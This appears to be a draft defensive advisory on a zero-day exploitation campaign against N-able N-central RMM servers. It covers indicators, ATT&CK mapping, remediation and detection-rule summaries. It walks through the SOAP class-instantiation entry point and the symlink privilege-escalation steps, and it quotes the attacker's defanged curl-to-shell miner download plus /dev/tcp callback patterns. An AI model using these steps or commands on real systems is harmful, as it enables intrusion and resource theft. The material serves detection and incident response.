# N-able N-central 4EverAble2Shell Zero-Day

**Date:** 2026-11-13
**Status:** DRAFT
**TLP:** CLEAR
**Author:** Actioner

---

## Executive Summary

On November 12, 2026, security researcher Sean Bales publicly released proof-of-concept exploit code for "4EverAble2Shell," a critical unauthenticated remote code execution chain targeting N-able's N-central remote monitoring and management (RMM) platform. The exploit chains CVE-2026-90436 (CVSS 9.8), an unsafe class instantiation flaw in the bundled Apache Axis SOAP component, with a local privilege escalation weakness to achieve root-level command execution. Within approximately five hours of the PoC's publication, threat intelligence firms Huntback and Lupovis observed active exploitation, with attackers deploying XMRig cryptocurrency miners on at least 21 N-central servers -- 19 of which were running the latest patched build (2026.4 HF2, build 2026.4.1.26). A companion vulnerability set dubbed "Agent2Shell" targets managed Windows agents with SYSTEM-level execution. N-able has restricted Legacy API access and Intune integration as interim mitigations and advises upgrading Agents and Probes to 2026.4 HF1+. Organizations running N-central should treat any exploitation indicator as a full compromise of the RMM server and all downstream managed endpoints.

---

## Background: N-able N-central

N-able N-central is a widely deployed remote monitoring and management (RMM) platform used by managed service providers (MSPs) to manage thousands of customer endpoints. A compromised N-central server represents a single point of failure that grants attackers access to every endpoint under its management, making it a high-value target for supply-chain attacks. The platform runs on a Linux appliance with components including Apache Axis SOAP services, Java-based management interfaces, and a privileged helper infrastructure (nable_wrapper.pl) for system operations.

### Prior Context

In October 2026, researchers linked the China-nexus group Volt Typhoon to zero-day exploitation of two earlier N-central flaws. On November 9, 2026, Bales released "Able2Shell," a set of 33 zero-day vulnerabilities, prompting N-able to take hosted N-central offline. N-able released Hotfix 2 (build 2026.4.1.26) on November 10 to address those issues. Two days later, Bales published 4EverAble2Shell and Agent2Shell, bypassing the freshly deployed patch.

---

## Technical Analysis

### Vulnerability Chain: 4EverAble2Shell

**Stage 1 -- Initial Access (Unauthenticated RCE as `nable`)**

- **CVE:** CVE-2026-90436 (Apache Axis unsafe class instantiation), CVSS 9.8
- **Tracked as:** VULN-2026-0009 (Previdian)
- **Endpoint:** `POST /dms/services/ServerUI` (Apache Axis SOAP service)
- **Mechanism:** A crafted SOAP fault message with `exceptionName` set to `jline.internal.TerminalLineSettings` causes Apache Axis to instantiate this JLine class during fault processing. The class's constructor executes a shell command derived from the fault's `data` field, achieving arbitrary command execution as the `nable` service account.
- **Prerequisite:** Legacy API must be enabled on the target N-central instance.
- **Probe behavior:** Initial reconnaissance uses `data` field value `probe` with User-Agent `Mozilla/5.0`.
- **Weaponized behavior:** Attack payloads use shell commands in the `data` field with User-Agent `python-requests/2.31.0`.

**Stage 2 -- Privilege Escalation (`nable` to `root`)**

- **Mechanism:** Symlink race condition abusing N-central's privileged helper infrastructure.
- **SHA-256 of escalation script:** `fc4c01fd11bc301cf312830460cfdccc3af9dcfe50c910b86d6a1117bc76c747`
- **Steps:**
  1. Creates a symlink: `/var/opt/n-central/flag/flag_default.json` -> `/opt/nable/var/ncsai/scripts/ServerChild.sh`
  2. Runs `sudo /opt/nable/usr/sbin/nable_wrapper.pl setLDFileOwner` which follows the symlink and changes ownership of `ServerChild.sh` to `nable`
  3. Rewrites `ServerChild.sh` with attacker payload
  4. Runs `sudo nable_wrapper.pl serverControl noop --wait` which executes `ServerChild.sh` as root
  5. Restores original `ServerChild.sh` and cleans up artifacts

**Stage 3 -- Post-Exploitation (XMRig Deployment)**

- As root, remounts `/tmp` with exec: `mount -o remount,exec /tmp`
- Downloads and executes miner installer: `curl -fsSL hxxp://157.20.241[.]16:8080/jup.sh | sh -s nc_<target-ip>`
- `jup.sh` creates working directory `/tmp/.xvd/` (fallback `/var/tmp/.xvd/`)
- Downloads XMRig binary from `hxxp://157.20.241[.]16:8080/xvgz` (gzip) or `/xmrig.tgz`
- Configures miner to use half of CPU cores (max 8), `--cpu-max-threads-hint 50`
- Rig ID follows pattern `nc_<victim-ip-with-dashes>`
- Establishes persistence via (in order): systemd unit `xvd.service`, user crontab `# xvkeep`, or `/etc/cron.d/xvd`
- Watchdog script `keep.sh` relaunches miner every 10 minutes
- Beacon check-ins to `hxxp://157.20.241[.]16:8080/ob/cronhit` and `/ob/fcheck`

### Variant: Agent2Shell

Agent2Shell comprises approximately a dozen zero-days allowing command execution on managed Windows agents with SYSTEM privileges. Technical details are limited; the PoC was published alongside 4EverAble2Shell on November 12, 2026. This variant targets the agent-side rather than the server-side.

### Affected Versions

- **Confirmed vulnerable:** N-central Appliance 2026.4.1.26 (Hotfix 2) with Legacy API enabled
- **Likely vulnerable:** Earlier versions of N-central; Bales indicated most flaws work on earlier versions
- **Not fully mitigated by:** Hotfix 2 (19 of 21 compromised servers were running it)

### Timeline (UTC, November 12, 2026)

| Time | Event |
|------|-------|
| 03:58 | PoC published on GitHub (github.com/MSPNightmare/CVEs) |
| ~06:12 | Vulnerability published (Previdian sensor) |
| ~07:13 | Public PoC created |
| 08:24 | First Previdian sensor observation |
| 08:30 | First probe from 157.20.241[.]16 (Huntback) |
| 09:16 | First weaponized request (Huntback) |
| 09:38 | First IOC recorded (Previdian) |
| 09:45 | Added to Previdian KEV feed |
| ~14:00 | Lupovis and Huntback report 21 compromised servers |

---

## Indicators of Compromise

### Network Indicators

| Indicator | Type | Context |
|-----------|------|---------|
| `157.20.241[.]16` | IPv4 | Exploit source, payload host (TCP 8080), callback listener (TCP 19202-19418) |
| `139.99.69[.]109:10128` | IPv4:Port | Primary XMRig mining pool proxy |
| `79.76.51[.]56:39100` | IPv4:Port | Fallback XMRig mining pool proxy |
| `3[.]74[.]48[.]121` | IPv4 | Scanning IP (Lupovis) |
| `5[.]231[.]45[.]175` | IPv4 | Scanning IP (Lupovis) |
| `hxxp://157.20.241[.]16:8080/jup.sh` | URL | Miner installer script |
| `hxxp://157.20.241[.]16:8080/xvgz` | URL | XMRig binary (gzip) |
| `hxxp://157.20.241[.]16:8080/xmrig.tgz` | URL | XMRig binary fallback |
| `hxxp://157.20.241[.]16:8080/ob/cronhit` | URL | Beacon check-in |
| `hxxp://157.20.241[.]16:8080/ob/fcheck` | URL | Beacon health check |

### Host Indicators

| Indicator | Type | Context |
|-----------|------|---------|
| `fc4c01fd11bc301cf312830460cfdccc3af9dcfe50c910b86d6a1117bc76c747` | SHA-256 | Privilege escalation Python script |
| `/tmp/.xvd/` or `/var/tmp/.xvd/` | Directory | Miner working directory |
| `/tmp/.xvd/x` | File | XMRig binary |
| `/tmp/.xvd/keep.sh` | File | Watchdog script |
| `/tmp/.xvd/xm.log` | File | Miner log |
| `/etc/systemd/system/xvd.service` | File | Systemd persistence |
| `/etc/cron.d/xvd` | File | Cron persistence |
| Crontab entry with `# xvkeep` | Cron | Crontab persistence marker |
| `/var/opt/n-central/flag/flag_default.json` (symlink) | File | Escalation artifact |
| `/var/opt/n-central/tmp/serverchild-*.bak` | File | Escalation backup |
| `/var/opt/n-central/tmp/serverchild-*.sh` | File | Escalation script |
| `/var/opt/n-central/tmp/serverchild-*.out` | File | Escalation output |
| `41wx2Pv3FzfRvX11jQgzM4bRbgvr6GViRXCKkHhXhLVQ64mgUR5ks4CEzHx8zqUJ8MgsWwTaWiS3uiZbCgJQnNXoB19mGtr` | Monero Wallet | Attacker mining wallet |

### Behavioral Indicators

| Indicator | Context |
|-----------|---------|
| POST to `/dms/services/ServerUI` with `jline.internal.TerminalLineSettings` in body | SOAP exploitation |
| POST to `/dms2/services2/ServerMMS2` with `SessionHello` | Able2Shell exploitation (WatchTowr) |
| User-Agent `python-requests/2.31.0` to SOAP endpoints | Weaponized requests |
| User-Agent ending in `N-central-sec-audit/1.0` | Able2Shell exploitation (WatchTowr) |
| `nable` user spawning `python3`, `base64`, or bash with `/dev/tcp` | Post-exploitation callback |
| `mount -o remount,exec /tmp` | Pre-miner deployment |
| Process command line containing `--rig-id nc_` | XMRig with campaign naming |
| New/unexpected administrator accounts | Account manipulation |

---

## MITRE ATT&CK Mapping

| Technique ID | Technique Name | Observable |
|-------------|----------------|------------|
| T1190 | Exploit Public-Facing Application | SOAP fault exploitation of /dms/services/ServerUI |
| T1059.004 | Command and Scripting Interpreter: Unix Shell | Shell commands via JLine class, jup.sh execution |
| T1059.006 | Command and Scripting Interpreter: Python | Python privilege escalation script |
| T1068 | Exploitation for Privilege Escalation | Symlink race via nable_wrapper.pl |
| T1548.003 | Abuse Elevation Control Mechanism: Sudo and Sudo Caching | sudo nable_wrapper.pl setLDFileOwner / serverControl noop |
| T1140 | Deobfuscate/Decode Files or Information | Base64-encoded Python payload |
| T1105 | Ingress Tool Transfer | curl download of jup.sh and xvgz from 157.20.241[.]16 |
| T1571 | Non-Standard Port | Callback on TCP 19202-19418, payload on TCP 8080 |
| T1095 | Non-Application Layer Protocol | Raw TCP callback via /dev/tcp |
| T1543.002 | Create or Modify System Process: Systemd Service | xvd.service persistence |
| T1053.003 | Scheduled Task/Job: Cron | /etc/cron.d/xvd and crontab xvkeep persistence |
| T1070.004 | Indicator Removal: File Deletion | Cleanup of ServerChild.sh backup and symlink |
| T1496 | Resource Hijacking | XMRig Monero cryptocurrency mining |

---

## Detection & Remediation

### Immediate Actions

1. **Disable Legacy API** on all N-central instances if not already disabled.
2. **Upgrade Agents and Probes** to N-central 2026.4 HF1 or later. Note: Hotfix 2 alone is NOT sufficient.
3. **Hunt for IOCs** on all N-central servers, particularly:
   - Files in `/tmp/.xvd/` or `/var/tmp/.xvd/`
   - Systemd unit `xvd.service` or cron entries containing `xvkeep`
   - Symlinks at `/var/opt/n-central/flag/flag_default.json`
   - Outbound connections to 157.20.241[.]16, 139.99.69[.]109, 79.76.51[.]56
4. **Review N-central activity logs** from November 8, 2026 onward.
5. **Restrict internet exposure** of N-central servers; place behind VPN or trusted network.
6. **Review administrator accounts** for unexpected additions, enabled "Default Administrator," or unfamiliar email addresses.

### If Compromised

- **Treat as full compromise** of the N-central server AND all customer endpoints it manages.
- Engage incident response; extend investigation to all managed networks.
- Do not simply clean the miner -- root-level access means any persistence mechanism could have been deployed.
- Audit for lateral movement to managed endpoints via N-central's management capabilities.

---

## Detection Rules

### Sigma Rules

All rules validated via `sigma convert --without-pipeline -t splunk` and `-t log_scale`. The `sigma check` command could not complete due to network restrictions preventing MITRE ATT&CK data retrieval; rule syntax and logic are confirmed valid.

#### Rule 1: SOAP Exploitation Attempt (nable-1.yml)

- **File:** `/tmp/actioner/nable-1.yml`
- **ID:** `8a3d1e72-bf40-4c12-9a5e-6d8f23c71a09`
- **Description:** Detects POST to /dms/services/ServerUI containing jline.internal.TerminalLineSettings in the request body
- **Log Source:** webserver (apache)
- **MITRE:** T1190
- **Compile Status:** PASS (sigma convert)
- **Confidence:** HIGH -- exploits a specific, campaign-unique class name in a specific endpoint

#### Rule 2: Privilege Escalation via nable_wrapper.pl (nable-2.yml)

- **File:** `/tmp/actioner/nable-2.yml`
- **ID:** `2c7f8a15-d3e6-4b91-a6c0-9e12d4f58b37`
- **Description:** Detects nable_wrapper.pl invocations with setLDFileOwner or serverControl noop arguments
- **Log Source:** process_creation (linux)
- **MITRE:** T1068, T1548.003
- **Compile Status:** PASS (sigma convert)
- **Confidence:** HIGH -- specific to the documented escalation technique

#### Rule 3: XMRig Miner File Artifacts (nable-3.yml)

- **File:** `/tmp/actioner/nable-3.yml`
- **ID:** `5e9b3d84-a17c-42f0-b8e5-1c6a09f72d63`
- **Description:** Detects creation of files in /tmp/.xvd/ or /var/tmp/.xvd/ directories
- **Log Source:** file_event (linux)
- **MITRE:** T1059.004, T1496
- **Compile Status:** PASS (sigma convert)
- **Confidence:** HIGH -- hidden directory name is specific to this campaign

#### Rule 4: Miner Persistence via Systemd/Cron (nable-4.yml)

- **File:** `/tmp/actioner/nable-4.yml`
- **ID:** `3f1a6c92-e054-48db-b7a3-d25e81f09c46`
- **Description:** Detects xvd.service systemd unit or /etc/cron.d/xvd file creation
- **Log Source:** file_event (linux)
- **MITRE:** T1543.002, T1053.003
- **Compile Status:** PASS (sigma convert)
- **Confidence:** HIGH -- service and cron names specific to this campaign

#### Rule 5: Outbound Connection to Attacker Infrastructure (nable-5.yml)

- **File:** `/tmp/actioner/nable-5.yml`
- **ID:** `7d4e2f10-ca83-4a69-8b15-3e7f62d09a84`
- **Description:** Detects connections to known attacker IPs (payload server and mining pools)
- **Log Source:** firewall
- **MITRE:** T1071.001, T1496
- **Compile Status:** PASS (sigma convert)
- **Confidence:** HIGH -- IPs confirmed in active exploitation; will need updates as infrastructure rotates

#### Rule 6: ServerChild.sh Symlink Manipulation (nable-6.yml)

- **File:** `/tmp/actioner/nable-6.yml`
- **ID:** `a8c61d53-f924-4e0b-9317-4b5c82e1a70f`
- **Description:** Detects file events at the flag_default.json symlink path and serverchild-* backup patterns
- **Log Source:** file_event (linux)
- **MITRE:** T1068
- **Compile Status:** PASS (sigma convert)
- **Confidence:** MEDIUM -- flag_default.json may be legitimately created by N-central; symlink status requires verification

#### Rule 7: Tmp Remount Exec and Curl Pipe to Shell (nable-7.yml)

- **File:** `/tmp/actioner/nable-7.yml`
- **ID:** `d2e58b93-7610-4d1a-ae4f-5f30c19e82b6`
- **Description:** Detects remounting /tmp with exec permissions or curl piping jup.sh from the attacker IP
- **Log Source:** process_creation (linux)
- **MITRE:** T1059.004, T1140
- **Compile Status:** PASS (sigma convert)
- **Confidence:** HIGH -- curl+IP+jup.sh is campaign-specific; remount is a useful behavioral indicator

#### Rule 8: Nable Account Spawning Suspicious Processes (nable-8.yml)

- **File:** `/tmp/actioner/nable-8.yml`
- **ID:** `b4917e6d-c253-4f8a-9d10-87a3ef520c16`
- **Description:** Detects the nable service account spawning python3, base64, or bash with /dev/tcp
- **Log Source:** process_creation (linux)
- **MITRE:** T1059.006, T1059.004
- **Compile Status:** PASS (sigma convert)
- **Confidence:** HIGH -- /dev/tcp usage by a service account is highly anomalous

#### Rule 9: Weaponised SOAP Request User-Agent (nable-9.yml)

- **File:** `/tmp/actioner/nable-9.yml`
- **ID:** `6e302c47-8a19-4f5b-b6d3-1c94a0e7f583`
- **Description:** Detects python-requests/2.31.0 User-Agent targeting N-central SOAP endpoints
- **Log Source:** webserver
- **MITRE:** T1190
- **Compile Status:** PASS (sigma convert)
- **Confidence:** MEDIUM -- User-Agent is easily spoofed; useful as an early-warning signal in context

### YARA Rules

#### File: `/tmp/actioner/nable-1.yar`

- **Compile Status:** PASS (yarac)
- **Rule 1: Nable_4EverAble2Shell_Privesc_Script** -- Detects the Python privilege escalation script (SHA-256: fc4c01fd...). Confidence: HIGH.
- **Rule 2: Nable_4EverAble2Shell_Miner_Installer_JupSh** -- Detects the jup.sh miner installer script by campaign-specific strings. Confidence: HIGH.
- **Rule 3: Nable_4EverAble2Shell_SOAP_Exploit_Payload** -- Detects SOAP exploit payloads with jline.internal.TerminalLineSettings. Confidence: HIGH.

### Suricata/Snort Rules

#### File: `/tmp/actioner/nable-1.rules`

- **Compile Status:** UNCOMPILED (no Suricata/Snort compiler available)
- **Rule 2026111301:** SOAP exploit attempt with JLine TerminalLineSettings. Confidence: HIGH.
- **Rule 2026111302:** Outbound connection to attacker payload server. Confidence: HIGH.
- **Rule 2026111303:** Primary XMRig mining pool connection. Confidence: HIGH.
- **Rule 2026111304:** Fallback XMRig mining pool connection. Confidence: HIGH.
- **Rule 2026111305:** jup.sh installer download from attacker server. Confidence: HIGH.
- **Rule 2026111306:** python-requests UA to SOAP endpoint. Confidence: MEDIUM.

---

## Sources

- [The Hacker News: Hackers Exploit N-Central Flaws to Deploy Crypto Miners](https://thehackernews.com/2026/11/hackers-exploit-n-central-flaws-to.html) -- Ravie Lakshmanan, Nov 13, 2026
- [SecurityWeek: Hackers Exploit New N-Central Zero-Day Hours After PoC Publication](https://www.securityweek.com/hackers-exploit-new-n-central-zero-day-hours-after-poc-publication/) -- Ionut Arghire, Nov 13, 2026
- [Infosecurity Magazine: N-able N-central Able2Shell Zero-Day](https://www.infosecurity-magazine.com/news/n-able-n-central-able2shell-0day/) -- Nov 11, 2026
- [Huntback: N-central 4EverAble2Shell - Miners on Live Servers](https://huntback.io/blog/ncentral-4everable2shell-miners-on-live-servers) -- Nov 12, 2026 (primary technical source)
- [Previdian: VULN-2026-0009](https://previdian.com/VULN-2026-0009) -- 4EverAble2Shell tracking
- [N-able Status: N-central 2026.4 HF2 Release Notes](https://status.n-able.com/2026/11/10/n-central-2026-4-hf2-release-notes/) -- Nov 10, 2026
- [N-able Incident Update](https://uptime.n-able.com/event/202613/) -- Nov 13, 2026
- [Beazley Security Advisory BSL-A1242](https://labs.beazley.security/advisories/BSL-A1242)
- [WatchTowr on X (Twitter)](https://x.com/watchtowrcyber/status/2120803577094439123) -- Exploitation probes
- [Sean Bales PoC Repository](https://github.com/MSPNightmare/CVEs) -- 4EverAble2Shell and Agent2Shell PoC code (WARNING: may contain malicious code)
